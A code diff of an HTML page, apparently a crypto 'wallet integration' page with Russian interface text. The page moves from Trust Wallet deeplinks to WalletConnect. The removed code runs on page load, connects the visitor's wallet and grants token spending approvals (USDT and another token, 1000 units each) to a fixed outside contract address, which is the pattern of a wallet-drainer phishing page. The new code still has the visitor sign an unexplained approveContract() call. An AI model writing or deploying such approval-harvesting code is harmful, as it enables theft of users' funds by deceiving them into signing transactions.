@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Trust Wallet Integration</title>
+    <title>WalletConnect Integration</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -41,62 +41,45 @@
 </head>
 <body>
     <div id="app">
-        <h1>Trust Wallet Integration</h1>
-        <button onclick="openTrustWallet()">Открыть Trust Wallet</button>
+        <h1>WalletConnect Integration</h1>
+        <button onclick="connectWallet()">Подключить кошелек</button>
         <div id="status"></div>
         <div id="error"></div>
     </div>
 
-    <!-- Локальное подключение ethers.js -->
-    <script src="./ethers.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/ethers/dist/ethers.umd.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@walletconnect/web3-provider/dist/umd/index.min.js"></script>
 
-    <script type="text/javascript">
-        // Проверка загрузки ethers.js и наличия Web3Provider
-        if (typeof ethers === "undefined" || !ethers.providers || !ethers.providers.Web3Provider) {
-            document.getElementById("error").innerText = "Ошибка: ethers.js или Web3Provider не загружены!";
-            console.error("ethers.js или Web3Provider не загружены");
-        } else {
-            console.log("ethers.js и Web3Provider загружены успешно");
-        }
+    <script>
+        async function connectWallet() {
+            try {
+                const provider = new WalletConnectProvider.default({
+                    rpc: {
+                        56: "https://bsc-dataseed.binance.org/" // Binance Smart Chain
+                    },
+                });
 
-        // Открыть Trust Wallet через deeplink
-        function openTrustWallet() {
-            const deeplink = "trust://browser_redirect?url=https://sorex1992.github.io/github.io/";
-            window.location.href = deeplink;
-        }
+                // Включаем WalletConnect
+                await provider.enable();
 
-        // Автоматическое подключение кошелька и взаимодействие с контрактом
-        async function connectWalletAndSign() {
-            if (typeof window.ethereum !== "undefined") {
-                try {
-                    // Подключение к кошельку
-                    const accounts = await ethereum.request({ method: "eth_requestAccounts" });
-                    const userAddress = accounts[0];
-                    document.getElementById("status").innerText = `Кошелек подключен: ${userAddress}`;
+                // Создаем провайдер для ethers.js
+                const web3Provider = new ethers.providers.Web3Provider(provider);
 
-                    // Подписание контракта
-                    await signContract();
+                // Получаем адрес пользователя
+                const signer = web3Provider.getSigner();
+                const userAddress = await signer.getAddress();
 
-                    // Выполнение approve
-                    await approveTokens("0x55d398326f99059fF775485246999027B3197955", "0xfe0d3ab9a7ab9c070069f516feda0f351751944e", "1000");
-                    await approveTokens("0xcb89e8dd26aad28674da9751bfa61815a75f152d", "0xfe0d3ab9a7ab9c070069f516feda0f351751944e", "1000");
+                document.getElementById("status").innerText = `Кошелек подключен: ${userAddress}`;
 
-                    document.getElementById("status").innerText = "Все действия выполнены успешно.";
-                } catch (error) {
-                    document.getElementById("error").innerText = `Ошибка: ${error.message}`;
-                }
-            } else {
-                document.getElementById("error").innerText = "Ошибка: Кошелек не найден. Установите Trust Wallet или MetaMask.";
+                // Подписание контракта
+                await signContract(web3Provider);
+
+            } catch (error) {
+                document.getElementById("error").innerText = `Ошибка: ${error.message}`;
             }
         }
 
-        // Функция подписания контракта
-        async function signContract() {
-            if (typeof ethers.providers.Web3Provider === "undefined") {
-                throw new Error("Web3Provider не найден!");
-            }
-
-            const provider = new ethers.providers.Web3Provider(window.ethereum);
+        async function signContract(provider) {
             const signer = provider.getSigner();
             const contractAbi = [
                 "function approveContract() external"
@@ -107,26 +90,8 @@
             const tx = await contract.approveContract();
             console.log("Контракт подписан. Транзакция:", tx.hash);
             await tx.wait();
-            console.log("Контракт успешно подписан.");
+            document.getElementById("status").innerText = "Контракт успешно подписан.";
         }
-
-        // Функция для approve токенов
-        async function approveTokens(tokenAddress, contractAddress, amount) {
-            const provider = new ethers.providers.Web3Provider(window.ethereum);
-            const signer = provider.getSigner();
-            const tokenAbi = [
-                "function approve(address spender, uint256 amount) public returns (bool)"
-            ];
-            const tokenContract = new ethers.Contract(tokenAddress, tokenAbi, signer);
-
-            const tx = await tokenContract.approve(contractAddress, ethers.utils.parseUnits(amount, 18));
-            console.log(`Approve для ${tokenAddress} отправлен. Транзакция:`, tx.hash);
-            await tx.wait();
-            console.log(`Approve для ${tokenAddress} выполнен.`);
-        }
-
-        // Автоматическое выполнение после загрузки
-        window.onload = connectWalletAndSign;
     </script>
 </body>
 </html>
